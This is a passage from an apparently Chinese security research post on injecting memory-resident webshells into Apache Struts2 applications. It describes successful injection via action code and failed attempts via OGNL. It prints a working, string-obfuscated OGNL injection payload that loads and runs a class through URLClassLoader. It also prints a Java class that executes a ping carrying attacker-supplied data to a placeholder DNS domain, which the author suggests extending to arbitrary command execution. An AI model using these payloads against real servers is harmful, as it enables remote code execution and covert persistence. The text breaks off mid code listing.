### 0x01 背景
之前写过一篇关于Struts2绕过的文章，当时就想过怎么去注入内存马，不然加载恶意类去执行命令，也挺烦的，再加上一直都没有看到过struts2内存马注入的工具、文章，奈何当时太菜，没有继续深入；前几天被mc提醒了一下，说是看到过Struts2内存马的一篇文章(放到文末了)，去看了一下，又勾起了对struts2内存马的研究欲望；
### 0x02 代码注入内存马成功
在action直接执行命令，是可以直接注入内存马
struts.xml如下
当访问login111的test2函数，注入内存马
执行命令
### 0x03 ognl注入内存马失败
#### 0x001 ognl注入失败的问题
这里想通过ognl表达式去注入内存马，发现不行，原因如下:
  * 如果把函数全部放到恶意类class里面，会找不到ActionContext.class，从而报错
  * 如果打算把函数全部放到ognl表达式里面，会发现在进行Thread创建对象的时候无法创建
当尝试使用ognl表达式一直赋值到obj5，再通过恶意类加载剩余的函数时，发现注入不了内存马，原因还是在于Classloader的问题，找不到相应的class，一直到这里，也不是没有收获的
发现了一个有点用的东西，可能可以进行自定义命令运行，如下:
这里payload含义是加载了hello.class，传入了cccc这个参数
    redirect:http://www.baidu.com${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter (),#bb0=new java.net.URL[]{new java.net.URL("file:/xxxx/xxxxx")},#cc0=new java.net.URLClassLoader(#bb0),#cc1=#cc0.loadClass("hello"),#ot.print(#cc1.getDeclaredMethods()[0].invoke("main",new java.lang.String[]{"a"},"cccc")),#ot.flush(),#ot.close()}
hello.class如下
    import java.lang.Runtime;  
    import java.lang.Process;  
    public class hello1 {  
        public hello1(String a) {  
            try {  
                String[] commands = { "ping","-c","1" ,a + "123412.xxxx.xxxxx.cn" };  
                Process pc = Runtime.getRuntime().exec(commands);  
            } catch (Exception e) {  
            }    }  
        public static void main(String[] args, String a) {  
            hello1 aa = new hello1(a);  
        }  
    }
可以自定义对域名进行请求，那么可以扩展成为shell去执行任意命令，而不需要去更改class
#### 0x002 问题1
接着说问题1，如果找不到ActionContext.class
贴上当时问的很傻的问题(classloader不同，当然不能这么放类)
那么我直接通过ClassLoader.defineClass去加载这个类呢
    //import org.apache.catalina.loader.WebappClassLoaderBase;  
    //import org.apache.struts2.ServletActionContext;  
    import java.io.FileWriter;  
    import java.io.IOException;  